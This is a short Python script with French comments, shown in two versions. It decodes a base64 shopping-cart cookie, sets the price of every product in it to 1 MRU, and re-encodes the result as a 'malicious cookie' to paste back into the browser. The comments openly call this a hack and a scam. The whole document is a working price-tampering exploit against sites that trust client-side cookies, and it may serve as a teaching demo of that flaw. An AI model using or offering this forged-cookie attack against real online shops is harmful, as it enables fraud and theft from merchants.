import json
import base64

# 1. Colle ici la valeur du cookie que tu as copié depuis le navigateur
cookie_original = "W3siaWQiOiAyLCAibm9tIjogIlBsYXlTdGF0aW9uIDUgU2xpbSIsICJwcml4IjogMTIwMDB9LCB7ImlkIjogMSwgIm5vbSI6ICJpUGhvbmUgMTUgUHJvIE1heCIsICJwcml4IjogMjUwMDB9XQ=="

# Si tu n'as pas copié, voici à quoi ça ressemble normalement pour iPhone + PS5 :
# cookie_original = "W3siaWQiOiAxLCAibm9tIjogImlQaG9uZSAxNSBQcm8gTWF4IiwgInByaXgiOiAyNTAwMH0sIHsiaWQiOiAyLCAibm9tIjogIlBsYXlTdGF0aW9uIDUgU2xpbSIsICJwcml4IjogMTIwMDB9XQ=="

print(f"--- 1. CONTENU ORIGINAL ---")
try:
    json_str = base64.b64decode(cookie_original).decode()
    data = json.loads(json_str)
    print(json.dumps(data, indent=2))
except:
    print("Erreur de décodage (Vérifie ta chaîne copiée)")
    data = [
        {"id": 1, "nom": "iPhone 15 Pro Max", "prix": 25000},
        {"id": 2, "nom": "PlayStation 5 Slim", "prix": 12000}
    ]

# 2. L'ATTAQUE : On modifie les prix en mémoire
print(f"\n--- 2. APPLICATION DU HACK (Mirade) ---")
for produit in data:
    print(f"Modification du prix pour {produit['nom']} : {produit['prix']} -> 1 MRU")
    produit['prix'] = 1  # <--- C'EST ICI QUE L'ARNAQUE SE PASSE

# 3. GÉNÉRATION DU COOKIE PIÉGÉ
payload_json = json.dumps(data)
cookie_forge = base64.b64encode(payload_json.encode()).decode()

print(f"\n--- 3. TON COOKIE MALVEILLANT (Copie ça !) ---")
print(cookie_forge)
print("-" * 30)


import json
import base64

# 1. Le cookie (intercepté via F12)
cookie_intercept = ""
# 2. Décodage
data = json.loads(base64.b64decode(cookie_intercept).decode())
print(f"Avant piratage : {data}")
# 3. Modification (L'attaque d'intégrité)
for produit in data:
    produit['prix'] = 1  # On force le prix à 1 MRU
# 4. Ré-encodage (Forge du cookie malveillant)
payload = json.dumps(data)
cookie_forge = base64.b64encode(payload.encode()).decode()
print(f"Cookie piégé à injecter : {cookie_forge}")

